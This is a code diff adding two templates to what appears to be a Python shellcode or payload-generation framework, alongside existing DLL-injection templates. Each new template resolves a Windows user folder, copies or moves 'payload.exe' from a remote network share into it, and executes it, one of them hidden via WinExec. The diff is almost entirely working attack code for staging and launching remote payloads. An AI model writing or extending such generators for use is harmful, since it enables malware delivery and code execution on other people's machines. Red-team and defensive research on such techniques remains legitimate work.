@@ -24,6 +24,9 @@ Reference workflows:
     CreateRemoteThread (DLL injection via LoadLibraryA)
   - messagebox: LoadLibraryA(user32.dll) + MessageBoxA proof-of-concept
   - file_write: CreateFileA + WriteFile + CloseHandle
+  - folder_path_exec: SHGetFolderPathA (Desktop/AppData) + CopyFileA + WinExec
+  - profile_dir_exec: OpenProcessToken + GetUserProfileDirectoryA +
+    MoveFileA + CreateProcessA
 """
 from __future__ import annotations
 
@@ -2703,4 +2706,270 @@ class IRFileWriteTemplate(WorkflowTemplate):
             ("Content written", content),
             ("Uses CreateFileA (7 args) + WriteFile", ""),
             ("CREATE_ALWAYS overwrites existing", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Folder path exec workflow (SHGetFolderPathA + download/copy + execute)
+# ---------------------------------------------------------------------------
+
+# CSIDL constants for SHGetFolderPathA
+_CSIDL_DESKTOP = 0x0000
+_CSIDL_APPDATA = 0x001A
+
+
+def build_folder_path_exec_workflow(
+    src_path: str = r"\\host\share\payload.exe",
+    filename: str = r"\payload.exe",
+    csidl: int = _CSIDL_DESKTOP,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the folder_path_exec reference workflow.
+
+    LoadLibraryA(shell32.dll) ->
+    SHGetFolderPathA(NULL, CSIDL, NULL, 0, buf) ->
+    lstrcatA(buf, filename) ->
+    CopyFileA(src, buf, FALSE) ->
+    WinExec(buf, SW_HIDE) -> exit
+
+    Uses SHGetFolderPathA to resolve a known folder (Desktop, AppData, etc.)
+    at runtime, then copies a file there and executes it. The CSIDL constant
+    selects the folder: 0x00 = Desktop, 0x1A = AppData, 0x05 = My Documents.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_folder_path_exec",
+        blocks=(
+            Block("entry", (
+                ConstructString("shell32_dll", "shell32.dll"),
+                ConstructString("src_path", src_path),
+                ConstructString("filename", filename),
+                AllocateStruct("dest_buf", "CHAR_BUFFER_260"),
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("shell32_dll"),),
+                    result="shell32_base",
+                ),
+                CallAPI(
+                    "SHGetFolderPathA",
+                    arguments=(
+                        Immediate(0),       # hwnd = NULL
+                        Immediate(csidl),   # csidl (folder ID)
+                        Immediate(0),       # hToken = NULL (current user)
+                        Immediate(0),       # dwFlags = 0
+                        AddressOf("dest_buf"),
+                    ),
+                    result="shget_ret",
+                ),
+                Compare("shget_ret", SuccessPredicate.ZERO,
+                        true_block="build_path", false_block="fail"),
+            )),
+            Block("build_path", (
+                CallAPI(
+                    "lstrcatA",
+                    arguments=(
+                        AddressOf("dest_buf"),
+                        AddressOf("filename"),
+                    ),
+                ),
+                CallAPI(
+                    "CopyFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dest_buf"),
+                        Immediate(0),       # bFailIfExists = FALSE
+                    ),
+                    result="copy_ret",
+                ),
+                Compare("copy_ret", SuccessPredicate.NONZERO,
+                        true_block="run_payload", false_block="fail"),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dest_buf"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare("exec_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRFolderPathExecTemplate(WorkflowTemplate):
+    """IR-backed folder_path_exec template (SHGetFolderPathA path discovery)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_folder_path_exec_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_folder_path_exec_workflow(
+            src_path=config.src_path or r"\\host\share\payload.exe",
+            filename=config.dst_path or r"\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        src = config.src_path or r"\\host\share\payload.exe"
+        fname = config.dst_path or r"\payload.exe"
+        return [
+            ("Source path", src),
+            ("Appended filename", fname),
+            ("Folder via SHGetFolderPathA (CSIDL_DESKTOP)", ""),
+            ("Copies then executes via WinExec", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Profile directory exec workflow (OpenProcessToken + GetUserProfileDirectoryA)
+# ---------------------------------------------------------------------------
+
+
+def build_profile_dir_exec_workflow(
+    src_path: str = r"\\host\share\payload.exe",
+    filename: str = r"\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the profile_dir_exec reference workflow.
+
+    LoadLibraryA(advapi32.dll) ->
+    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) ->
+    LoadLibraryA(userenv.dll) ->
+    GetUserProfileDirectoryA(hToken, buf, &size) ->
+    lstrcatA(buf, filename) ->
+    MoveFileA(src, buf) ->
+    CreateProcessA(NULL, buf, ...) -> exit
+
+    Uses OpenProcessToken + GetUserProfileDirectoryA to resolve the full
+    user profile path (e.g. C:\\Users\\username) at runtime, then moves a
+    file there and executes it via CreateProcessA. This is the alternative
+    to GetUserNameA + manual path concatenation.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_profile_dir_exec",
+        blocks=(
+            Block("entry", (
+                ConstructString("advapi_dll", "advapi32.dll"),
+                ConstructString("userenv_dll", "userenv.dll"),
+                ConstructString("src_path", src_path),
+                ConstructString("filename", filename),
+                AllocateStruct("dest_buf", "CHAR_BUFFER_260"),
+                AllocateLocal("token_handle"),
+                AllocateLocal("buf_size"),
+                AllocateStruct("si", "STARTUPINFOA"),
+                AllocateStruct("pi", "PROCESS_INFORMATION"),
+
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("advapi_dll"),),
+                    result="advapi_base",
+                ),
+                StoreLocal("buf_size", Immediate(260)),
+                CallAPI(
+                    "OpenProcessToken",
+                    arguments=(
+                        Immediate(_CURRENT_PROCESS_HANDLE),
+                        Immediate(0x0008),  # TOKEN_QUERY
+                        AddressOf("token_handle"),
+                    ),
+                    result="opt_ret",
+                ),
+                Compare("opt_ret", SuccessPredicate.NONZERO,
+                        true_block="get_profile", false_block="fail"),
+            )),
+            Block("get_profile", (
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("userenv_dll"),),
+                    result="userenv_base",
+                ),
+                CallAPI(
+                    "GetUserProfileDirectoryA",
+                    arguments=(
+                        NameRef("token_handle"),
+                        AddressOf("dest_buf"),
+                        AddressOf("buf_size"),
+                    ),
+                    result="gpd_ret",
+                ),
+                Compare("gpd_ret", SuccessPredicate.NONZERO,
+                        true_block="build_path", false_block="fail"),
+            )),
+            Block("build_path", (
+                CallAPI(
+                    "lstrcatA",
+                    arguments=(
+                        AddressOf("dest_buf"),
+                        AddressOf("filename"),
+                    ),
+                ),
+                CallAPI(
+                    "MoveFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dest_buf"),
+                    ),
+                    result="move_ret",
+                ),
+                Compare("move_ret", SuccessPredicate.NONZERO,
+                        true_block="run_payload", false_block="fail"),
+            )),
+            Block("run_payload", (
+                ZeroStruct("si"),
+                WriteStructField("si", "cb", Immediate(0x44)),
+                ZeroStruct("pi"),
+                CallAPI(
+                    "CreateProcessA",
+                    arguments=(
+                        Immediate(0),       # lpApplicationName = NULL
+                        AddressOf("dest_buf"),
+                        Immediate(0),       # lpProcessAttributes = NULL
+                        Immediate(0),       # lpThreadAttributes = NULL
+                        Immediate(0),       # bInheritHandles = FALSE
+                        Immediate(0),       # dwCreationFlags = 0
+                        Immediate(0),       # lpEnvironment = NULL
+                        Immediate(0),       # lpCurrentDirectory = NULL
+                        AddressOf("si"),
+                        AddressOf("pi"),
+                    ),
+                    result="cpa_ret",
+                ),
+                Compare("cpa_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRProfileDirExecTemplate(WorkflowTemplate):
+    """IR-backed profile_dir_exec template (GetUserProfileDirectoryA path discovery)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_profile_dir_exec_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_profile_dir_exec_workflow(
+            src_path=config.src_path or r"\\host\share\payload.exe",
+            filename=config.dst_path or r"\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        src = config.src_path or r"\\host\share\payload.exe"
+        fname = config.dst_path or r"\payload.exe"
+        return [
+            ("Source path", src),
+            ("Appended filename", fname),
+            ("Path via OpenProcessToken + GetUserProfileDirectoryA", ""),
+            ("Moves file then executes via CreateProcessA (10 args)", ""),
         ]
